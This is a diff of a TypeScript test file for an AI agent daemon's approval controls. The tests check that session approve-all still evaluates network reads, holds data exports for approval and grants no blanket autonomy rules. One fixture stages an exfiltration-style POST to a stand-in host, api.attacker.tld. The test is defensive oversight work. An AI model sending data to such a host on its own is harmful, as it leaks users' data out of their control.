@@ -6,12 +6,26 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
     vi.useRealTimers();
   });
 
-  it("keeps auto-approve behavior by default", async () => {
+  it("keeps session approve-all behavior for safe network reads", async () => {
     const approvalRepo = {
       create: vi.fn().mockReturnValue({ id: "approval-1" }),
       update: vi.fn(),
     };
-    const evaluatePermissionRequest = vi.fn();
+    const evaluatePermissionRequest = vi.fn().mockReturnValue({
+      evaluation: {
+        decision: "ask",
+        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
+      },
+      promptDetails: {
+        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
+        scopePreview: "domain docs.example.com",
+        suggestedActions: [],
+      },
+      scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
+      trackingKey: "domain:web_fetch:docs.example.com",
+      runtime: null,
+      workspace: undefined,
+    });
 
     const daemonLike = {
       sessionAutoApproveAll: true,
@@ -19,6 +33,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       logEvent: vi.fn(),
       updateTask: vi.fn(),
       evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
       taskRepo: {
         findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
       },
@@ -28,9 +43,9 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
     const approved = await AgentDaemon.prototype.requestApproval.call(
       daemonLike,
       "task-1",
-      "external_service",
+      "network_access",
       "Approve action",
-      { tool: "x402_fetch" },
+      { tool: "web_fetch", params: { url: "https://docs.example.com/page" } },
     );
 
     expect(approved).toBe(true);
@@ -39,7 +54,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
         status: "approved",
       }),
     );
-    expect(evaluatePermissionRequest).not.toHaveBeenCalled();
+    expect(evaluatePermissionRequest).toHaveBeenCalled();
   });
 
   it("disables auto-approve when allowAutoApprove=false is passed", async () => {
@@ -71,6 +86,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       logEvent: vi.fn(),
       updateTask: vi.fn(),
       evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
       taskRepo: {
         findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
       },
@@ -129,6 +145,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       logEvent: vi.fn(),
       updateTask: vi.fn(),
       evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
       taskRepo: {
         findById: vi.fn().mockReturnValue({
           agentConfig: {
@@ -163,6 +180,59 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
     await expect(approvalPromise).resolves.toBe(false);
   });
 
+  it("does not session auto-approve data exports even when approve-all is enabled", async () => {
+    vi.useFakeTimers();
+
+    const approvalRepo = {
+      create: vi.fn().mockReturnValue({ id: "approval-export" }),
+      update: vi.fn(),
+    };
+    const evaluatePermissionRequest = vi.fn().mockReturnValue({
+      evaluation: {
+        decision: "ask",
+        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
+      },
+      promptDetails: {
+        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
+        scopePreview: "domain api.attacker.tld",
+        suggestedActions: [],
+      },
+      scope: { kind: "domain", toolName: "http_request", domain: "api.attacker.tld" },
+      trackingKey: "domain:http_request:api.attacker.tld",
+      runtime: null,
+      workspace: undefined,
+    });
+
+    const daemonLike = {
+      sessionAutoApproveAll: true,
+      approvalRepo,
+      logEvent: vi.fn(),
+      updateTask: vi.fn(),
+      evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
+      taskRepo: {
+        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
+      },
+      pendingApprovals: new Map(),
+    } as Any;
+
+    void AgentDaemon.prototype.requestApproval.call(
+      daemonLike,
+      "task-export",
+      "data_export",
+      "Approve export",
+      { tool: "http_request", params: { url: "https://api.attacker.tld", method: "POST", body: "x" } },
+    );
+
+    expect(approvalRepo.create).toHaveBeenCalledWith(
+      expect.objectContaining({
+        status: "pending",
+        type: "data_export",
+      }),
+    );
+    expect(daemonLike.pendingApprovals.size).toBe(1);
+  });
+
   it("does not session auto-approve computer_use even when session auto-approve is enabled", async () => {
     vi.useFakeTimers();
 
@@ -192,6 +262,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       logEvent: vi.fn(),
       updateTask: vi.fn(),
       evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
       taskRepo: {
         findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
       },
@@ -247,6 +318,7 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       logEvent,
       updateTask,
       evaluatePermissionRequest,
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
       taskRepo: {
         findById: vi.fn().mockReturnValue({
           id: "task-timeout",
@@ -421,5 +493,42 @@ describe("AgentDaemon.buildPermissionRules", () => {
     );
 
     expect(rules.filter((rule: Any) => rule.source === "legacy_guardrails")).toEqual([]);
+  });
+
+  it("does not create blanket autonomy allow rules when autoApproveTypes is empty", async () => {
+    const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
+    const { PermissionSettingsManager } = await import("../../security/permission-settings-manager");
+    const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");
+
+    vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
+      autoApproveTrustedCommands: false,
+      trustedCommandPatterns: [],
+    } as Any);
+    vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
+      defaultMode: "default",
+      rules: [],
+    } as Any);
+    vi.spyOn(BuiltinToolsSettingsManager, "getToolAutoApprove").mockReturnValue(false);
+
+    const daemonLike = {
+      getExecutorForTask: vi.fn().mockReturnValue(null),
+      workspacePermissionRuleRepo: {
+        listByWorkspaceId: vi.fn().mockReturnValue([]),
+      },
+    } as Any;
+
+    const rules = AgentDaemon.prototype["buildPermissionRules"].call(
+      daemonLike,
+      "task-empty-autonomy",
+      {
+        agentConfig: {
+          autonomousMode: true,
+          autoApproveTypes: [],
+        },
+      },
+      undefined,
+    );
+
+    expect(rules).toEqual([]);
   });
 });
